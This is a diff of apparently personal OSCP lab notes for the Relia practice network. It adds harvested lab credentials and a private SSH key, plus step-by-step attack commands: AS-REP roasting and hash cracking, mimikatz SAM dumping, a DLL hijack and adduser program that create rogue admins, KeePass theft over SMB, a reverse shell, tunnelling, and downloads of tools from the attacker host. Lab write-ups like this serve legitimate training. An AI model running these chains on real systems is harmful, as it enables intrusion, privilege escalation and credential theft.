@@ -6,6 +6,9 @@ damon
 maildmz@relia.com:DPuBT9tGCBrTbR
 jim@relia.com
 jim:mercedes1
+michelle:NotMyPassword0k?
+andrea:PasswordPassword_6
+andrew:Rb9kNokjDsjYyH
 ## Users
 anita
 mark
@@ -15,26 +18,40 @@ offsec
 emma
 adrian
 damon
-
+andrea
+andrew
 ## Passwords
 OathDeeplyReprieve91
 fireball
 SomersetVinyl1!
 !8@aBRBYdb3!
 DPuBT9tGCBrTbR
+PasswordPassword_6
+Rb9kNokjDsjYyH
+
 #### AD - Creds 
 jim:Castello1!
 dmzadmin:SlimGodhoodMope
+
+Administrator:vau!XCKjNQBv2$
 ###### User
 jim
 dmzadmin
-
+andrea
+michelle
+milana 
+sarah
+amy
+mountuser
 ##### Pass
 SlimGodhoodMope
 Castello1!
-
+NotMyPassword0k?
+placeholder
+backups1 
+DRtajyCwcbWvH/9
 ## Pathways
-245 > 246 > 247 > 248 > 249 > 189/14/191 > 
+245 > 246 > 247 > 248 > 249 > 189/14/191 > 7 > 15 > 19 > 20 > 21
 
 
 ## HOSTNAME and RELIA FLAGS (15)
@@ -133,6 +150,15 @@ Nmap done: 1 IP address (1 host up) scanned in 98.84 seconds
 
 ```
 
+2. Found creds on machine 21 shares. Obtained proof on deskotp
+```
+──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains xfreerdp /cert-ignore /u:'AdministraNQBv2$' /v:172.16.99.6 /d:relia.com
+
+37a1e7d4ced5f7cdf7b1cceff3073f93
+
+```
+
 ## 7
 ```
 proxychains nmap -sT --top-ports=20 $Ip
@@ -202,7 +228,84 @@ Nmap done: 1 IP address (1 host up) scanned in 95.58 seconds
 
 ```
 
+2. Rdp with mchelle creds and obtained local proof on desktop
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ xfreerdp /cert-ignore /u:michelle /p:'NotMyPassword0k?' /v:172.16.99.7 /d:relia.com
+```
 
+3. Located scheduler running program on desktop (started chisel connected here). Then, download scheduler.exe in kali
+```
+(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains python3 /home/kali/impacket/examples/smbserver.py -username michelle -password NotMyPassword0k? -smb2support share .
+
+
+PS:C\ copy .\Scheduler.exe \\192.168.42.242\share\scheduler.exe
+
+```
+
+4. Uploaded and debuge with procmon64 tool. Found that beyondhelper.dll is not found in it. 
+```
+PS C:\Windows\system32> New-Service -Name "UniqueScheduler" -BinaryPathName "C:\Users\offsec\Desktop\scheduler.exe" -DisplayName "Scheduler"
+
+Status   Name               DisplayName
+------   ----               -----------
+Stopped  UniqueScheduler    Scheduler
+
+
+PS C:\Windows\system32> Restart-Service Scheduler
+WARNING: Waiting for service 'Scheduler (UniqueScheduler)' to start...
+WARNING: Waiting for service 'Scheduler (UniqueScheduler)' to start...
+PS C:\Windows\system32>
+```
+
+6. Create a dll playload with rouge user. 
+```
+(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ nano myDLL.cpp  
+                                                                             
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+```
+
+6. Upload in scheduler folder.  Restart service and user rogue will be added. 
+```
+iwr -uri http://192.168.45.242:800/myDLL.dll -Outfile C:\scheduler\beyondhelper.dll
+
+Restart-Service Schduler 
+```
+
+7. RDP login as rogue in domain INTRANET
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ xfreerdp /cert-ignore /u:dave2 /p:'password123!' /v:172.16.99.7 /d:Intranet 
+
+```
+
+8. Obtained proof.txt in desktop of administrator user
+```
+9fcbe44923ef60c553c084777818cea6
+```
+
+9. Obtained ntlm has of user andrea using mimikatz
+```
+PS C:\Users\dave2\Desktop> iwr -uri http://192.168.45.242:800/mimikatz.exe -Outfile mimikatz.exe
+PS C:\Users\dave2\Desktop> .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::sam
+   [00000003] Primary
+         * Username : andrea
+         * Domain   : RELIA
+         * NTLM     : ce3f12443651168b3793f5fbcccff9db
+```
+
+10. Crack ntlm hash
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ hashcat -m 1000 adreantlm.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
+
+ce3f12443651168b3793f5fbcccff9db:PasswordPassword_6 
+```
 ## 14
 1. Automatically connect to this machine when performing phishing attack on 191
 ```
@@ -283,6 +386,83 @@ Nmap done: 1 IP address (1 host up) scanned in 74.45 seconds
 
 ```
 
+2. Find out schedule.ps1 in drive C. Then, read it and found it adding file 'updatecollcto.exe' as scheduled task so, created a useradd.c file and upload it accordingly. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ cat adduser.c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+PS C:\updatecollector> iwr -uri http://192.168.45.242/adduser.exe  -Outfile updatecollctor.exe
+```
+
+3. A user has been updated. 
+```
+PS C:\updatecollector> net user
+
+User accounts for \\WK02
+
+-------------------------------------------------------------------------------
+Administrator            dave2                    DefaultAccount
+Guest                    offsec                   WDAGUtilityAccount
+The command completed successfully.
+```
+
+
+4. Rdp login and obtained proof.txt on desktop of malena user. 
+```
+┌──(kali㉿kali)-[~]
+└─$ proxychains xfreerdp /cert-ignore /u:dave2 /p:'password123!' /v:172.16.99.15 /d:WKO1
+
+ed1eb51889ea11e980ad14d2de81e168
+
+```
+
+5. Post-exploitatation- Download database.kdbx to local kali (First copy and pas)
+```
+proxychains python3 /home/kali/impacket/examples/smbserver.py -username dave2 -password 'password123!' -smb2support share .
+
+C:\Users\milana\Documents>copy Database.kdbx \\192.168.45.242\share\data.kdbx
+        1 file(s) copied.
+
+```
+
+6. Cracked database.kdbx using hashcat and found creds. 
+```
+keepass2john data.kdbx >keepass2.hash 
+
+$ hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+23d11fa560e31*a2335d1597fdd70dcd53d96e8de2278cb705639a2a79fe51c130b5b15752d14a:destiny1
+
+
+kpcli:/Database> show -f 0
+
+Title: BACKUP Machine SSH Key
+Uname: sarah
+ Pass: placeholder
+  URL: 
+Notes: -----BEGIN OPENSSH PRIVATE KEY-----
+       b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+       QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
+       YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
+       AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
+       YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
+       -----END OPENSSH PRIVATE KEY-----
+
+```
 
 ## 19
 ```
@@ -323,6 +503,115 @@ Not shown: 1000 filtered tcp ports (no-response)
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 108.24 seconds
 
+```
+
+2. Used ssh login with sarah creds login 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ chmod 600 sarah_idrsa 
+
+
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains ssh -i sarah_idrsa sarah@172.16.99.19 -p 22 
+```
+
+3. Found loal.txt in sarah home directory
+```
+$ SHELL=/bin/bash script -q /dev/null
+sarah@backup:~$ whoami
+sarah
+sarah@backup:~$ dir
+local.txt
+sarah@backup:~$ cat local.txt 
+5acb658a68b7d8d924de5ea0446ba5fb
+```
+
+4. Sudo permissions 
+```
+sarah@backup:/usr/bin$ sudo -l
+Matching Defaults entries for sarah on backup:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sarah may run the following commands on backup:
+    (ALL) NOPASSWD: /usr/bin/borg list *
+    (ALL) NOPASSWD: /usr/bin/borg extract *
+    (ALL) NOPASSWD: /usr/bin/borg mount *
+
+```
+
+5. Find writable files. 
+```
+sarah@backup:/$ find / -writable -type d 2>/dev/null
+/dev/mqueue
+/dev/shm
+/tmp
+```
+
+6. Check on background processes with pspy64 to see how backup is going on. Transfer file. 
+```
+sarah@backup:/tmp$ wget http://192.168.45.242/pspy64
+--2024-02-17 10:19:00--  http://192.168.45.242/pspy64
+Connecting to 192.168.45.242:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3078592 (2.9M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64              100%[================>]   2.94M   392KB/s    in 7.9s    
+
+2024-02-17 10:19:09 (380 KB/s) - ‘pspy64’ saved [3078592/3078592]
+
+```
+
+7. Start pspy64. Obtained backup passpharase
+```
+sarah@backup:/tmp$ chmod 777 pspy64 
+sarah@backup:/tmp$ ./pspy64 
+
+
+2024/02/17 10:20:18 CMD: UID=0    PID=8190   | /bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1708165218 /media/usb0
+```
+
+8. Extract files using borg and make it leave outside root. 
+```
+sarah@backup:~$ sudo /usr/bin/borg extract --stdout /opt/borgbackup/::home
+
+```
+
+9. Obtained hash for amy and user for machine 20. 
+```
+sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
+{
+    "user": "amy",
+    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf
+```
+
+10. Crack hash. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ hashcat -m 0 amy.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+814b6b7f0de51ecf54ca5b6e6e612bf:backups1 
+```
+
+11. Login using obtained creds. Obtained proof
+```
+sarah@backup:~$ su amy
+Password: 
+$ whoami
+amy
+
+amy@backup:~$ sudo -l
+Matching Defaults entries for amy on backup:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User amy may run the following commands on backup:
+    (ALL) NOPASSWD: ALL
+    (ALL : ALL) ALL
+
+root@backup:~# cat proof.txt 
+7cad9d79363fd8d66a1b4a075c024cdf
 ```
 
 
@@ -369,6 +658,117 @@ Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 182.21 seconds
 
+```
+
+2. Obtained creds from machine 19 and using it to ssh login. 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains ssh andrew@172.16.99.2
+
+$ whoami
+andrew:Rb9kNokjDsjYyH
+
+```
+
+3. Can read both proof.txt and local.txt as andrew
+```
+[andrew@production /usr/home/andrew]$ cat local.txt 
+1f66e43f69b91fc491e3a575826e4d1d
+
+
+[andrew@production /root]$ cat proof.txt 
+81ee442155ccd77b42efb672cd264e55
+```
+
+4. Post - enumeration. Performed PE and obatined use mountuser creds. 
+```
+1. Read does.conf file 
+[andrew@production /usr/local/etc]$ cat doas.conf
+# Sample file for doas
+# Please see doas.conf manual page for information on setting
+# up a doas.conf file.
+
+# Permit members of the wheel group to perform actions as root.
+permit nopass :wheel
+
+# Permit user alice to run commands a root user.
+# permit alice as root
+
+# Permit user bob to run programs as root, maintaining
+# environment variables. Useful for GUI applications.
+## permit keepenv bob as root
+
+# Permit user cindy to run only the pkg package manager as root
+# to perform package updates and upgrades.
+## permit cindy as root cmd pkg args update
+## permit cindy as root cmd pkg args upgrade
+
+# Allow david to run id command as root without logging it
+# permit nolog david as root cmd id
+
+permit nopass andrew as root cmd service args apache24 onestart
+
+
+
+2. Start apache24
+[andrew@production /usr/local/etc]$ doas -u root service apache24 onestart
+Performing sanity check on apache24 configuration:
+AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 127.0.0.1. Set the 'ServerName' directive globally to suppress this message
+Syntax OK
+Starting apache24.
+
+3. Added pentest monkey reverse shell with it. 
+[andrew@production /usr/local/www/apache24/data/phpMyAdmin/tmp]$ nano shell.php
+
+
+4. Obtained reverse shell 
+                                                                     
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ nc -nvlp 1234 
+listening on [any] 1234 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.209.191] 63175
+FreeBSD production 12.3-RELEASE-p6 FreeBSD 12.3-RELEASE-p6 GENERIC  amd64
+ 7:57AM  up  4:12, 1 user, load averages: 0.31, 0.36, 0.42
+USER       TTY      FROM            LOGIN@  IDLE WHAT
+andrew     pts/0    172.16.99.254   7:17AM     1 script -q /dev/null
+uid=80(www) gid=80(www) groups=80(www),0(wheel)
+sh: can't access tty; job control turned off
+$ id
+uid=80(www) gid=80(www) groups=80(www),0(wheel)
+$ SHELL=/bin/bash script -q /dev/null
+[www@production /]$
+
+
+5. Added user andrew to the wheel group using doas 
+[www@production /home/mountuser]$ /usr/local/bin/doas pw usermod andrew -G wheel
+<er]$ /usr/local/bin/doas pw usermod andrew -G wheel
+[www@production /home/mountuser]$
+
+
+6. Login again with ssh and obtained credentails of mountusers
+$ /usr/local/bin/doas -u root cat .history
+#+1667314347
+whoami
+#+1667314351
+ls
+#+1667314352
+ls -al
+#+1667314356
+cd
+#+1667314359
+ls -al
+#+1667314378
+vi .mailrc
+#+1667314393
+ls -al
+#+1667314401
+vi .profile
+#+1667314422
+sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21
+#+1667314426
+exit
+#+1667314481
+exit
 ```
 
 
@@ -422,6 +822,60 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 92.83 seconds
 
+```
+
+
+2. Checked out the shares using obtained creds of user mountuser
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains crackmapexec smb 172.16.99.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d relia.com --shares 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.99.21:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.99.21:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.99.21:135  ...  OK
+SMB         172.16.99.21    445    FILES            [*] Windows 10.0 Build 20348 x64 (name:FILES) (domain:relia.com) (signing:False) (SMBv1:False)
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.99.21:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.99.21:445  ...  OK
+SMB         172.16.99.21    445    FILES            [+] relia.com\mountuser:DRtajyCwcbWvH/9 
+SMB         172.16.99.21    445    FILES            [+] Enumerated shares
+SMB         172.16.99.21    445    FILES            Share           Permissions     Remark                                                                                
+SMB         172.16.99.21    445    FILES            -----           -----------     ------                                                                                
+SMB         172.16.99.21    445    FILES            ADMIN$                          Remote Admin                                                                          
+SMB         172.16.99.21    445    FILES            apps            READ            
+SMB         172.16.99.21    445    FILES            C$                              Default share                                                                         
+SMB         172.16.99.21    445    FILES            IPC$            READ            Remote IPC                                                                            
+SMB         172.16.99.21    445    FILES            monitoring      READ            
+SMB         172.16.99.21    445    FILES            scripts         READ,WRITE  
+```
+
+3. Smb login for reading monitoring and scripts file
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains smbclient //172.16.99.21/scripts -U relia//mountuser%DRtajyCwcbWvH/9
+
+
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains smbclient //172.16.99.21/monitoring -U relia//mountuser%DRtajyCwcbWvH/9
+```
+
+4. Found Domain controller credentials in one of the file
+```
+smb: \> get PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt
+getting file \PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt of size 8860 as PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt (4.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)
+
+Administrator:vau!XCKjNQBv2$
+```
+
+5. Impacket login 
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ proxychains impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.99.21
+
+
+C:\Users\Administrator\Desktop> type proof.txt
+d4f3e3eae781501b741336d21160fb0b
 ```
 
 
@@ -490,6 +944,15 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 91.13 seconds
 
 
+```
+
+2. Used domain controller creds to get proof
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$  proxychains xfreerdp /cert-ignore /u:'Administrator' /p:'vau!XCKjNQBv2$' /v:172.16.99.30 /d:relia.com
+
+
+261737ddbb21472132a5003aa7f7f7e9
 ```
 
 
@@ -640,6 +1103,19 @@ Uname: jim@relia.com
 Notes: 
 
 ```
+
+6. After domain controller compromising, obtained proof on desktop after impacket login
+```
+┌──(kali㉿kali)-[~]
+└─$ proxychains impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@192.168.209.189
+
+
+C:\Users\Administrator\Desktop> type proof.txt
+6bbd237370d420a7bb510f139a46c99f
+
+```
+
+
 ## 191
 1. Rustscan and Nmap scans
 ```
@@ -732,6 +1208,32 @@ Nmap done: 1 IP address (1 host up) scanned in 74.10 seconds
 559557270c4cdcdaddb6e6401bc2aae5
 ```
 
+3. Establish ligolong conection from here to internal network
+```
+$ sudo ip tuntap add user kali mode tun ligolo
+sudo: unable to resolve host kali: Name or service not known
+[sudo] password for kali: 
+                                                                             
+┌──(kali㉿kali)-[~/OSCP/ligolong]
+└─$ sudo ip link set ligolo up  
+sudo: unable to resolve host kali: Name or service not known
+                                                                             
+┌──(kali㉿kali)-[~/OSCP/ligolong]
+└─$ ./linproxy -selfcert
+
+
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ sudo ip route add 172.16.99.0/24 dev ligolo 
+
+
+PS C:\Users\dmzadmin\Desktop> iwr -uri http://192.168.45.242:8000/winagent.exe  -Outfile agent.exe
+PS C:\Users\dmzadmin\Desktop>  .\agent.exe -connect 192.168.45.242:11601 -ignore-cert
+time="2024-02-16T15:24:11-08:00" level=warning msg="warning, certificate validation disabled"
+time="2024-02-16T15:24:11-08:00" level=info msg="Connection established" addr="192.168.45.242:11601"
+
+
+
+```
 ## 245
 1. Rustscan and Nmap scans
 ```
@@ -1029,6 +1531,31 @@ proxychains sudo netdiscover -r 172.16.106.0/24
  192.168.189.254 00:50:56:e5:d3:d8      1      60  VMware, Inc.            
 
 zsh: suspended  sudo proxychains netdiscover -r 172.16.106.0/24
+```
+
+14. Aserproast domain 6
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ impacket-GetNPUsers -dc-ip 172.16.99.6  -request -outputfile hashes.asreproast relia.com/jim 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+Name      MemberOf                                 PasswordLastSet             LastLogon                   UAC      
+--------  ---------------------------------------  --------------------------  --------------------------  --------
+michelle  CN=INTRANETRDP,CN=Users,DC=relia,DC=com  2022-10-27 05:07:31.426158  2022-10-27 09:49:41.581981  0x410200 
+
+
+
+$krb5asrep$23$michelle@RELIA.COM:477ec59433c299e2980cf688ab32be4d$9c547f505ab0cde183471181ce063e26b97f9acc5540ed102b5ecb8fac0d37ee706e36ce11ccb1eb777eac111126d07d76f336087ef9fecf13025a7b6628d95557ae707eefa222f24d37ef22523c81344e37d60e5fb11b4258d66bdf3da1d0f9a5a5eaec419b74caa56725d9dab6d269d50a5719a90c6fe61213858b8636888630a3653363cb199f766fa2ad8489e8ae576c7ac55e2d0f66124088c0e05ebb907e813ee4d317b4b6c875282414963f1c75d69ead01ca010ee711aa404b736884fdad90d45fc8089330a0abbf23e315d0f2067ef13ef33339ef0850a9f2e1f3f6b0d26fb114ef
+```
+
+15. Cracked creds of michelle
+```
+┌──(kali㉿kali)-[~/OSCP/labs/relia]
+└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+$krb5asrep$23$michelle@RELIA.COM:477ec59433c299e2980cf688ab32be4d$9c547f505ab0cde183471181ce063e26b97f9acc5540ed102b5ecb8fac0d37ee706e36ce11ccb1eb777eac111126d07d76f336087ef9fecf13025a7b6628d95557ae707eefa222f24d37ef22523c81344e37d60e5fb11b4258d66bdf3da1d0f9a5a5eaec419b74caa56725d9dab6d269d50a5719a90c6fe61213858b8636888630a3653363cb199f766fa2ad8489e8ae576c7ac55e2d0f66124088c0e05ebb907e813ee4d317b4b6c875282414963f1c75d69ead01ca010ee711aa404b736884fdad90d45fc8089330a0abbf23e315d0f2067ef13ef33339ef0850a9f2e1f3f6b0d26fb114ef:NotMyPassword0k?
 ```
 
 ## 246
